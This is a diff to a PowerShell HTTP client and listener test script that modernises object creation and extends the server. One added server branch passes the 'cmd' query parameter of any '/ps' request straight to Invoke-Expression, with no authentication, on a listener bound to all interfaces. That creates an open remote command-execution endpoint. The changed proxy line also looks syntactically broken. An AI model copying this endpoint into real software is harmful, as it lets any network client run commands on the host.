@@ -6,6 +6,7 @@ invoke-webRequest "https://raw.githubusercontent.com/jagilber/powershellScripts/
 
  do a final client connect to free up close
 #>
+using namespace System.Threading.Tasks;
 [cmdletbinding()]
 param(
     [int]$port = 80,
@@ -68,32 +69,39 @@ function main() {
 
 function start-client([hashtable]$header = $clientHeaders, [string]$body = $clientBody, [net.http.httpMethod]$method = [net.http.httpmethod]::new($clientMethod), [string]$clientUri = $uri) {
     $iteration = 0
-    $httpClientHandler = new-object net.http.HttpClientHandler
+    $httpClientHandler = [net.http.httpClientHandler]::new()
+    $httpClientHandler.AllowAutoRedirect = $true
+    $httpClientHandler.AutomaticDecompression = [net.decompressionmethods]::GZip
+    $httpClientHandler.UseCookies = $false
+    $httpClientHandler.UseDefaultCredentials = $false
+    $httpClientHandler.UseProxy = $false
+    $clientUri = [uri]::EscapeUriString($clientUri)
+    $result = $null
 
     if($useClientProxy) {
         $proxyPort = $port++
         start-server -asjob -serverPort $proxyPort
         $httpClientHandler.UseProxy = $true
-        $httpClientHandler.Proxy = new-object net.webproxy("http://localhost:$proxyPort/",$false)
+        $httpClientHandler.Proxy = net.webproxy("http://localhost:$proxyPort/",$false)
     }
 
-    $httpClient = New-Object net.http.httpClient($httpClientHandler)
-
+    $httpClient = [net.http.httpClient]::new($httpClientHandler)
 
     while ($iteration -lt $count -or $count -eq 0) {
-        try {
+        try  {
             $requestId = [guid]::NewGuid().ToString()
-            write-verbose "request id: $requestId"
-            $requestMessage = new-object net.http.httpRequestMessage($method, $clientUri )
-            $responseMessage = new-object net.http.httpResponseMessage
+            write-host "request id: $requestId"
+            $requestMessage = [net.http.httpRequestMessage]::new($method, $clientUri )
+            $responseMessage = $null;#[net.http.httpResponseMessage]::new()
 
             if($method -ine [net.http.httpMethod]::Get) {
-                $httpContent = new-object net.http.stringContent([string]::Empty,[text.encoding]::ascii,'text/html')
+                $httpContent = [net.http.stringContent]::new([string]::Empty,[text.encoding]::ascii,'text/html')
                 $requestMessage.Content = $httpContent
+                $responseMessage = $httpClient.SendAsync($requestMessage)
             }
             else {
-                $httpContent = new-object net.http.stringContent([string]::Empty,[text.encoding]::ascii,'text/html')
-                $responseMessage.Content = $httpContent
+                $httpContent = [net.http.stringContent]::new([string]::Empty,[text.encoding]::ascii,'text/html')
+                $responseMessage = $httpClient.GetAsync($requestMessage.RequestUri,0)
             }
 
             if ($header.Count -lt 1) {
@@ -105,10 +113,16 @@ function start-client([hashtable]$header = $clientHeaders, [string]$body = $clie
                 $requestMessage.Headers.Add('x-ms-client-request-id', $requestId)
             }
 
-            $httpClient.SendAsync($requestMessage).Wait()
+            $result = $responseMessage.Result
+            $resultContent = $result.Content.ReadAsStringAsync().Result
+
+            write-host "result content: $resultContent" -ForegroundColor Cyan
+
+            write-verbose "result: $($result | convertto-json)"
             #write-host ($httpClient | fl * | convertto-json -Depth 99)
+            write-verbose ($responseMessage | convertto-json)
             #$requestMessage.
-            $httpClient
+            Write-Verbose ($httpClient | convertto-json)
             #pause
         
             if ($error) {
@@ -151,13 +165,18 @@ function start-server([bool]$asjob, [int]$serverPort = $port) {
 
     }
 
+    # need admin access to set urlacl. maybe use tcp instead?
+    # write-host "netsh http add urlacl url=http://+:$serverPort/ user=everyone listen=yes"
+    # start-process -Verb runas -FilePath 'cmd.exe' -ArgumentList '/c netsh http add urlacl url=http://+:$serverPort/ user=everyone listen=yes'
+
     write-host "start-server:creating listener"
     $iteration = 0
     $http = [net.httpListener]::new();
     $http.Prefixes.Add("http://$(hostname):$serverPort/")
-    $http.Prefixes.Add("http://*:$serverPort/")
+    $http.Prefixes.Add("http://+:$serverPort/")
+    # https://learn.microsoft.com/en-us/windows/win32/http/add-urlacl
     $http.Start();
-    $maxBuffer = 1024
+    $maxBuffer = 1024000
 
     if ($http.IsListening) {
         write-host "http server listening. max buffer $maxBuffer"
@@ -177,6 +196,7 @@ function start-server([bool]$asjob, [int]$serverPort = $port) {
 
             [string]$html = $null
             write-host "$(get-date) http server $($context.Request.UserHostAddress) received $($context.Request.HttpMethod) request:`r`n"
+            write-verbose "request: $($context.Request | ConvertTo-Json)"
 
             if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {
                 write-host "$(get-date) $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -ForegroundColor Magenta
@@ -188,6 +208,15 @@ function start-server([bool]$asjob, [int]$serverPort = $port) {
                 write-host "$(get-date) $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -ForegroundColor Magenta
                 $html = "$(get-date) http server $($env:computername) received $($context.Request.HttpMethod) request:`r`n"
                 $html += "`r`nREQUEST HEADERS:`r`n$($requestHeaders | out-string)`r`n"
+            }
+            elseif ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl.StartsWith('/ps')) {
+                write-host "$(get-date) $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -ForegroundColor Magenta
+                $html = "$(get-date) http server $($env:computername) received $($context.Request.HttpMethod) request:`r`n"
+                #$html += $context | ConvertTo-Json # -depth 99
+                write-host "Invoke-Expression $($context.Request.QueryString.GetValues('cmd'));"
+                $result = convertto-json (Invoke-Expression $($context.Request.QueryString.GetValues('cmd')));# -depth 99;
+                write-host "result: $result"
+                $html += $result
             }
             elseif ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -ieq $absolutePath) {
                 write-host "$(get-date) $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -ForegroundColor Magenta
@@ -219,6 +248,7 @@ function start-server([bool]$asjob, [int]$serverPort = $port) {
                 $context.Response.OutputStream.Close()
             }
         
+            $context.Response.Close()
             $iteration++
         }
         catch {
